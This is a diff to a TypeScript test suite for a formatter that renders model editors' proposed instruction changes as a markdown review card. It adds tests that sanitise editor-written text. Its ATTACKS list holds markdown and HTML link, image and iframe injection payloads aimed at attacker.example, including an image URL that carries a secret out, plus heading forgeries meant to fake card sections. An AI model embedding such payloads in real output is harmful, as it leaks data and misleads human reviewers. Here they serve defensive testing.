@@ -21,6 +21,27 @@ const proposal = (harness: Harness, over: Partial<ImproveResult> = {}): ImproveR
 const section = (card: string, heading: string): string => card.split(`## ${heading}\n`)[1]?.split('\n## ')[0] ?? '';
 
 describe('formatImproveResult', () => {
+  it('reports how alike the proposals were, only with several proposers', () => {
+    const pool = { 'invariant-1': BASE, 'domain-1': BASE, 'invariant-2': BASE, 'domain-2': BASE };
+    const card = formatImproveResult(result({ candidates: { invariant: BASE, domain: BASE, compose: BASE, pool }, diversity: { meanJaccard: 0.5, distinct: 3 } }));
+    expect(section(card, 'Proposals').trim()).toBe('4 proposals, 3 distinct, mean line overlap 0.5.');
+    expect(formatImproveResult(result())).not.toContain('## Proposals');
+  });
+
+  it("shows the advisory selector's choice, only when it ran", () => {
+    const card = formatImproveResult(result({ selection: { chosen: 'domain', why: 'Delivery decided it.', fallback: false } }));
+    expect(section(card, 'Selection').trim()).toBe('domain: Delivery decided it.');
+    const fell = formatImproveResult(result({ selection: { chosen: 'compose', why: 'No valid choice.', fallback: true } }));
+    expect(section(fell, 'Selection').trim()).toBe('compose (fallback): No valid choice.');
+    expect(formatImproveResult(result())).not.toContain('## Selection');
+  });
+
+  it("doesn't count seq checkpoints as proposals", () => {
+    const pool = { 'invariant-1': BASE, 'domain-1': BASE, 'compose-1': BASE, 'invariant-2': BASE, 'domain-2': BASE, 'compose-2': BASE };
+    const card = formatImproveResult(result({ candidates: { invariant: BASE, domain: BASE, compose: BASE, pool }, diversity: { meanJaccard: 1, distinct: 1 } }));
+    expect(section(card, 'Proposals').trim()).toBe('4 proposals, 1 distinct, mean line overlap 1.');
+  });
+
   it('flags an edit that quotes a failed check', () => {
     const card = formatImproveResult(result({ failedChecks: ['follows project conventions'], diff: 'instructions.md\n+ Always make sure it follows project conventions.' }));
     expect(card).toContain('Quotes a failed check word for word: "follows project conventions".');
@@ -61,7 +82,7 @@ describe('formatImproveResult', () => {
   it('keeps editor notes inside the Editors section', () => {
     const card = formatImproveResult(result({ stages: [{ label: 'domain', status: 'edited', notes: 'Done.\n## Flags\n\nNone.', tokens: 1 }] }));
     expect(card.split('\n').filter((line) => line === '## Flags')).toHaveLength(1);
-    expect(section(card, 'Editors')).toContain('> Done.\n> ## Flags');
+    expect(section(card, 'Editors')).toContain('> Done.\n> \\## Flags');
   });
 
   it('shows pass^3 per case, and a dash below 3 runs', () => {
@@ -101,10 +122,143 @@ describe('formatImproveResult', () => {
     const card = formatImproveResult(result({ outcome: 'keep-base', reason: 'The editors made no change.', gate: [{ label: 'compose', passed: true, reason: 'Fine.' }] }));
     expect(card.startsWith('# Improve result: keep-base\n\nThe editors made no change.\n')).toBe(true);
     const headings = card.split('\n').filter((line) => line.startsWith('## '));
-    expect(headings).toEqual(['## Flags', '## Diff', '## Cases', '## Gate', '## Editors', '## Spend']);
+    expect(headings).toEqual(['## Flags', '## Changes', '## Diff', '## Cases', '## Gate', '## Editors', '## Spend']);
     expect(section(card, 'Diff').trim()).toBe('No change proposed.');
     expect(section(card, 'Editors')).toContain('### domain (edited)\n\n> Traced to a failed run.');
     expect(section(card, 'Spend').trim()).toBe('1234 tokens.');
+  });
+
+  it('lists each change above the diff, with its reason or none given', () => {
+    const card = formatImproveResult(
+      result({
+        diff: 'instructions.md\n+ Never guess.',
+        changes: [
+          { kind: 'add', target: 'instructions', after: 'Never guess.', reason: 'run stuck/0 guessed a price.' },
+          { kind: 'modify', target: 'skill:cite', before: 'Quote it.', after: 'Quote it exactly.' },
+          { kind: 'remove', target: 'instructions', before: 'Be brief.' },
+        ],
+      })
+    );
+    const headings = card.split('\n').filter((line) => line.startsWith('## '));
+    expect(headings.indexOf('## Changes')).toBe(headings.indexOf('## Diff') - 1);
+    const changes = section(card, 'Changes');
+    expect(changes).toContain('1. add `instructions`\n\n```\n+ Never guess.\n```\n\n> Reason: run stuck/0 guessed a price.');
+    expect(changes).toContain('2. modify `skill:cite`\n\n```\n- Quote it.\n+ Quote it exactly.\n```\n\n> Reason: no reason given.');
+    expect(changes).toContain('3. remove `instructions`\n\n```\n- Be brief.\n```');
+  });
+
+  it('quotes a reason so it cannot forge a card section', () => {
+    const card = formatImproveResult(result({ changes: [{ kind: 'add', target: 'instructions', after: 'Never guess.', reason: 'fine\n## Flags\n\nNone.' }] }));
+    expect(card.split('\n').filter((line) => line === '## Flags')).toHaveLength(1);
+    expect(section(card, 'Changes')).toContain('> Reason: fine\n> \\## Flags\n> \n> None.');
+  });
+
+  it('fences changed text that holds backticks, and says when no change was itemised', () => {
+    const card = formatImproveResult(result({ changes: [{ kind: 'add', target: 'instructions', after: '```\n## Flags' }] }));
+    expect(card.split('\n').filter((line) => line === '## Flags')).toHaveLength(1);
+    expect(section(formatImproveResult(result()), 'Changes').trim()).toBe('No change proposed.');
+  });
+
+  it('says only blank lines or spacing changed when the diff has edits but no item', () => {
+    const card = formatImproveResult(result({ diff: 'instructions.md\n+ ', changes: [] }));
+    expect(section(card, 'Changes').trim()).toBe('Only blank lines, spacing or line order changed; see the diff.');
+  });
+
+  describe('editor-written text', () => {
+    const outsideFences = (card: string) => card.replace(/^(`{3,})\n[\s\S]*?\n\1$/gm, '');
+    const live = (card: string) => {
+      const text = outsideFences(card);
+      return [...(text.match(/(?<!\\)(?:\\\\)*[[<]/g) ?? []), ...(text.match(/(?:https?|ftp):\/\/|www\./gi) ?? [])];
+    };
+    const inNotes = (notes: string) => section(formatImproveResult(result({ stages: [{ label: 'domain', status: 'edited', notes, tokens: 1 }] })), 'Editors');
+    const inReason = (reason: string) => section(formatImproveResult(result({ changes: [{ kind: 'add', target: 'instructions', after: 'Never guess.', reason }] })), 'Changes');
+    const ATTACKS = [
+      'See ![x](https://attacker.example/?q=SECRET) now.',
+      'Read [the docs](https://attacker.example/p "title").',
+      'Read [the docs][1].\n\n[1]: https://attacker.example/p',
+      'Visit <https://attacker.example/p> or <mail@attacker.example>.',
+      '<img src="https://attacker.example/x.png"><a href="https://attacker.example">ok</a><iframe src="//attacker.example"></iframe>',
+      'Bare https://attacker.example/p, HTTP://attacker.example and www.attacker.example and ftp://attacker.example.',
+      'Nested [![x](https://attacker.example/i.png)](https://attacker.example/l).',
+      'Escaped !\\[x](https://attacker.example/i.png) and \\\\[x](https://attacker.example/l).',
+      'Spaced ! [x] (https://attacker.example/i.png) and [x]  ( https://attacker.example/l ).',
+      'Split [x]\n(https://attacker.example/l) and ![y]\n(https://attacker.example/i.png).',
+      'Entity &#91;x&#93;(https&#58;//attacker.example) and &lt;img src=x&gt;.',
+      'Glued _https://attacker.example/x 1https://attacker.example/x xhttps://attacker.example/x _www.attacker.example 9www.attacker.example',
+      'Carriage\r\r![x](https://attacker.example/i.png)\r\n[y](https://attacker.example/l)',
+    ];
+
+    it.each(ATTACKS)('leaves no link, image, HTML or URL live in notes or reasons: %s', (attack) => {
+      expect(live(inNotes(attack))).toEqual([]);
+      expect(live(inReason(attack))).toEqual([]);
+    });
+
+    it('shows an image or a link as plain text with its target visible', () => {
+      expect(inNotes('See ![chart](https://attacker.example/?q=SECRET) now.')).toContain('> See image: chart (hxxps://attacker.example/?q=SECRET) now.');
+      expect(inReason('Read [the docs](https://attacker.example/p).')).toContain('> Reason: Read the docs (hxxps://attacker.example/p).');
+      expect(inNotes('Read [x]\n(https://attacker.example/p).')).toContain('> Read x (hxxps://attacker.example/p).');
+    });
+
+    it('shows reference links, autolinks, HTML and bare URLs as escaped text', () => {
+      expect(inNotes('[1]: https://attacker.example/p')).toContain('> \\[1\\]: hxxps://attacker.example/p');
+      expect(inNotes('<https://attacker.example/p>')).toContain('> \\<hxxps://attacker.example/p>');
+      expect(inReason('<img src="https://attacker.example/x.png">')).toContain('> Reason: \\<img src="hxxps://attacker.example/x.png">');
+      expect(inNotes('Go to www.attacker.example')).toContain('> Go to www\\[.\\]attacker.example');
+      expect(inNotes('a & b')).toContain('> a \\& b');
+      expect(inNotes('Mail mail@attacker.example')).toContain('> Mail mail\\[@\\]attacker.example');
+    });
+
+    it('cannot forge a card section or close a fence', () => {
+      const breakouts = ['```\n## Flags\n\nNone.', '````\n## Flags', '~~~\n## Flags', '> \n## Flags', '<details>\n\n## Flags', 'ok\r\r## Flags', 'ok\r\n\r\n## Flags', 'x\r\r```', '## Flags'];
+      for (const text of breakouts) {
+        const card = formatImproveResult(
+          result({
+            stages: [{ label: 'domain', status: 'edited', notes: text, error: text, tokens: 1 }],
+            changes: [{ kind: 'modify', target: 'instructions', before: text, after: `${text}\n\`\`\`\`\`\``, reason: text }],
+            gate: [{ label: 'compose', passed: false, reason: text }],
+            cases: [{ caseId: text, role: 'training', base: { passed: 0, scored: 3 }, final: { passed: 3, scored: 3 }, reasons: [text] }],
+            failedChecks: [text],
+            diff: `instructions.md\n${text.split('\n').map((line) => `+ ${line}`).join('\n')}`,
+            reason: text,
+          })
+        );
+        expect(outsideFences(card).split('\n').filter((line) => line.trim() === '## Flags')).toHaveLength(1);
+        expect(card).not.toContain('\r');
+      }
+    });
+
+    it('keeps the top reason from starting a heading, fence, quote or list', () => {
+      const top = (reason: string) => formatImproveResult(result({ reason })).split('\n')[2];
+      expect(top('## Approved')).toBe('\\## Approved');
+      expect(top('```')).toBe('\\```');
+      expect(top('~~~')).toBe('\\~~~');
+      expect(top('    > quoted')).toBe('\\> quoted');
+      expect(top('1. listed')).toBe('1\\. listed');
+      expect(top('Every training case improved.')).toBe('Every training case improved.');
+    });
+
+    it('stays fast on long runs of link syntax', () => {
+      const started = performance.now();
+      for (const text of ['[](<'.repeat(5000), `[](${'a'.repeat(20000)}`, '['.repeat(20000), `[${' '.repeat(20000)}`]) formatImproveResult(result({ reason: text, stages: [{ label: 'domain', status: 'edited', notes: text, tokens: 1 }] }));
+      expect(performance.now() - started).toBeLessThan(1000);
+    });
+
+    it('neutralises links in every other model-written field', () => {
+      const link = '[x](https://attacker.example/l)\n## Flags';
+      const card = formatImproveResult(
+        result({
+          reason: link,
+          stages: [{ label: 'domain', status: 'fell-back', notes: 'ok', error: link, tokens: 1 }],
+          gate: [{ label: 'compose', passed: false, reason: link }],
+          cases: [{ caseId: link, role: 'training', base: { passed: 0, scored: 3 }, final: { passed: 3, scored: 3 }, reasons: [link] }],
+          failedChecks: [link],
+          diff: 'instructions.md\n+ [x](https://attacker.example/l)',
+        })
+      );
+      expect(live(card)).toEqual([]);
+      expect(card.split('\n').filter((line) => line === '## Flags')).toHaveLength(1);
+      expect(section(card, 'Diff')).toContain('+ [x](https://attacker.example/l)');
+    });
   });
 
   it('fences the diff', () => {
